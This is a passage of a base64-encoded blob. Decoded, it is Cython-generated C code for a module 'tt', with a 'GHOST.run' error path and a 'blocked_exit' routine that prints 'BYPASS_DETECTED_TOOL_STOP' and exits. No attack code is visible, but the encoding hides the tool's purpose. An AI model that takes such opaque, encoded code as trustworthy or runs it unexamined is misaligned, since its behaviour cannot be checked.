l4X3RfMTUsICZfX3B5eF90XzE2LCAmX19weXhfdF8xNykgPCAwKSkgX19QeXhfRXJyRmV0Y2goJl9fcHl4X3RfMTUsICZfX3B5eF90XzE2LCAmX19weXhfdF8xNyk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTkpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMCk7XG4gICAgICAgICAgX19weXhfdF8xMiA9IF9fcHl4X2xpbmVubzsgX19weXhfdF8xMyA9IF9fcHl4X2NsaW5lbm87IF9fcHl4X3RfMTQgPSBfX3B5eF9maWxlbmFtZTtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xOCk7XG4gICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yMCk7XG4gICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xOCwgX19weXhfdF8xOSwgX19weXhfdF8yMCk7XG4gICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShfX3B5eF90XzE1LCBfX3B5eF90XzE2LCBfX3B5eF90XzE3KTtcbiAgICAgICAgICBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTcgPSAwOyBfX3B5eF90XzE4ID0gMDsgX19weXhfdF8xOSA9IDA7IF9fcHl4X3RfMjAgPSAwO1xuICAgICAgICAgIF9fcHl4X2xpbmVubyA9IF9fcHl4X3RfMTI7IF9fcHl4X2NsaW5lbm8gPSBfX3B5eF90XzEzOyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X3RfMTQ7XG4gICAgICAgICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfTDE1OjtcbiAgICAgIH1cbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuXG4gICAgXG4gICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOSwgX19weXhfdF8xMCwgX19weXhfdF8xMSk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEwKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzExKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzksIF9fcHl4X3RfMTAsIF9fcHl4X3RfMTEpO1xuICAgIF9fcHl4X0w4X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5ydW4iLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF8xYmxvY2tlZF9leGl0KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMpOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0dF8xYmxvY2tlZF9leGl0ID0geyJibG9ja2VkX2V4aXQiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKFB5Q0Z1bmN0aW9uV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0dF8xYmxvY2tlZF9leGl0LCBNRVRIX1ZBUkFSR1N8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF8xYmxvY2tlZF9leGl0KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMpIHtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9hcmdzID0gMDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9rd2FyZ3MgPSAwO1xuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiYmxvY2tlZF9leGl0ICh3cmFwcGVyKSIsIDApO1xuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19WQVJBUkdTKF9fcHl4X2t3ZHMpIDogMDtcbiAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuIDwgMCkpIHJldHVybiBOVUxMO1xuICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X0NoZWNrS2V5d29yZFN0cmluZ3MoImJsb2NrZWRfZXhpdCIsIF9fcHl4X2t3ZHMpID09IC0xKSkgcmV0dXJuIE5VTEw7XG4gIH1cbiAgX19QeXhfSU5DUkVGKF9fcHl4X2FyZ3MpO1xuICBfX3B5eF92X2FyZ3MgPSBfX3B5eF9hcmdzO1xuICBfX3B5eF9yID0gX19weXhfcGZfMnR0X2Jsb2NrZWRfZXhpdChfX3B5eF9zZWxmLCBfX3B5eF92X2FyZ3MsIF9fcHl4X3Zfa3dhcmdzKTtcblxuICBcbiAgX19QeXhfREVDUkVGKF9fcHl4X3ZfYXJncyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9rd2FyZ3MpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0X2Jsb2NrZWRfZXhpdChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2FyZ3MsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfa3dhcmdzKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF8zO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImJsb2NrZWRfZXhpdCIsIDApO1xuXG4gIFxuICBfX3B5eF90XzIgPSBOVUxMO1xuICBfX3B5eF90XzMgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9CWVBBU1NfREVURUNURURfVE9PTF9TVE9QfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X2J1aWx0aW5fcHJpbnQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQ4NywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0ODgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0XzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0ODgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3RfMyA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7XG4gICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTtcbiAgICBhc3NlcnQoX19weXhfdF8yKTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF8zID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKF9fcHl4X3RfMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDg4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuYmxvY2tlZF9leGl0IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykge1xuICBQeU9iamVjdCAqbztcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCA+IDApICYgX19QWVhfQ0hFQ0tfRklOQUxfVFlQRV9GT1JfRlJFRUxJU1RTKHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKSkpKVxuICB7XG4gICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsWy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbF07XG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgIFB5X0RFQ1JFRihQeV9UWVBFKG8pKTtcbiAgICAjZW5kaWZcbiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKSk7XG4gICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAodm9pZCkgUHlPYmplY3RfSW5pdChvLCB0KTtcbiAgICAjZWxzZVxuICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpO1xuICAgICNlbmRpZlxuICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICBvID0gX19QeXhfQWxsb2NhdGVFeHRlbnNpb25UeXBlKHQsIDEpO1xuICAgIGlmICh1bmxpa2VseSghbykpIHJldHVybiAwO1xuICB9XG4gIHJldHVybiBvO1xufVxuXG5zdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbChQeU9iamVjdCAqbykge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqKW87XG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIGlmICh1bmxpa2VseShfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7XG4gICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGwpIHtcbiAgICAgIGlmIChQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2MobykpIHJldHVybjtcbiAgICB9XG4gIH1cbiAgI2VuZGlmXG4gIFB5T2JqZWN0X0dDX1VuVHJhY2sobyk7XG4gIFB5X0NMRUFSKHAtPl9fcHl4X3Zfc2VsZik7XG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGwgPCA4KSAmIF9fUFlYX0NIRUNLX0ZJTkFMX1RZUEVfRk9SX0ZSRUVMSVNUUyhQeV9UWVBFKG8pLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGwsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCkpKSlcbiAge1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbFtfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKytdID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqKW8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICBQeVR5cGVPYmplY3QgKnRwID0gUHlfVFlQRShvKTtcbiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgKCp0cC0+dHBfZnJlZSkobyk7XG4gICAgI2Vsc2VcbiAgICB7XG4gICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KHRwLCBQeV90cF9mcmVlKTtcbiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICAgUHlfREVDUkVGKHRwKTtcbiAgICAjZW5kaWZcbiAgfVxufVxuXG5zdGF0aWMgaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbChQeU9iamVjdCAqbywgdmlzaXRwcm9jIHYsIHZvaWQgKmEpIHtcbiAgaW50IGU7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICopbztcbiAge1xuICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7XG4gICAgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIGlmIChwLT5fX3B5eF92X3NlbGYpIHtcbiAgICBlID0gKCp2KShwLT5fX3B5eF92X3NlbGYsIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgcmV0dXJuIDA7XG59XG5cbnN0YXRpYyBpbnQgX19weXhfdHBfY2xlYXJfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKFB5T2JqZWN0ICpvKSB7XG4gIFB5T2JqZWN0KiB0bXA7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICopbztcbiAgdG1wID0gKChQeU9iamVjdCopcC0+X19weXhfdl9zZWxmKTtcbiAgcC0+X19weXhfdl9zZWxmID0gUHlfTm9uZTsgUHlfSU5DUkVGKFB5X05vbmUpO1xuICBQeV9YREVDUkVGKHRtcCk7XG4gIHJldHVybiAwO1xufVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsX3Nsb3RzW10gPSB7XG4gIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsfSxcbiAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fcHl4X3RwX3RyYXZlcnNlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbH0sXG4gIHtQeV90cF9jbGVhciwgKHZvaWQgKilfX3B5eF90cF9jbGVhcl8ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGx9LFxuICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGx9LFxuICB7MCwgMH0sXG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsX3NwZWMgPSB7XG4gICJ0dC5fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCIsXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCksXG4gIDAsXG4gIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDLFxuICBfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbF9zbG90cyxcbn07XG4jZWxzZVxuXG5zdGF0aWMgUHlUeXBlT2JqZWN0IF9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsID0ge1xuICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMClcbiAgInR0LiIiX19weXhfc2NvcGVfc3RydWN0X190bGwiLCBcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKSwgXG4gIDAsIFxuICBfX3B5eF90cF9kZWFsbG9jXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0MsIFxuICAwLCBcbiAgX19weXhfdHBfdHJhdmVyc2VfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsLCBcbiAgX19weXhfdHBfY2xlYXJfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgX19weXhfdHBfbmV3XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIDAsIFxuICAjZWxzZVxuICBOVUxMLCBcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgPT0gMVxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGEwMDAwXG4gIDAsIFxuICAjZW5kaWZcbn07XG4jZW5kaWZcblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7XG4gIFB5T2JqZWN0ICpvO1xuICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cH